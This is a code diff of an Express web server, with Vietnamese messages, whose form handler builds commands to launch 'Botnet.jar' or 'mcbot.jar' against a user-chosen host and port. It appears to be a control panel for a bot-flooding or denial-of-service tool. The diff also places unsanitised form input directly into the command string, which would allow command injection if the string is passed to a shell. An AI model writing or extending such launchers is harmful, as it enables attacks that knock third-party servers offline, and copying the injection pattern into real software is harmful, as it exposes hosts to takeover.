@@ -7,19 +7,24 @@ const PORT = 3000;
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
-
-// Phục vụ file tĩnh trong thư mục public
 app.use(express.static(path.join(__dirname, 'public')));
 
 app.post('/submit', (req, res) => {
-  const { host, port, method } = req.body;
+  const { host, port, method, launcher } = req.body;
 
-  if (!host || !port || !method) {
-    return res.status(400).send("❌ Vui lòng nhập đầy đủ Host, Port và chọn phương thức.");
+  if (!host || !port || !method || !launcher) {
+    return res.status(400).send("❌ Vui lòng nhập đầy đủ thông tin.");
   }
 
-  const fullTarget = `${host}:${port}`;
-  const cmd = `java -jar Botnet.jar ${fullTarget} 766 ${method} 300 9000`;
+  let cmd;
+
+  if (launcher === 'LT1') {
+    cmd = `java -jar Botnet.jar ${host}:${port} 340 ${method} 300 30`;
+  } else if (launcher === 'LT2' && method === 'botjoiner') {
+    cmd = `java -jar mcbot.jar ${host}:${port} 340 ${method} 300 30`;
+  } else {
+    return res.status(400).send("❌ Phương thức không hợp lệ cho LT2.");
+  }
 
   console.log("👉 Chạy lệnh:", cmd);
 
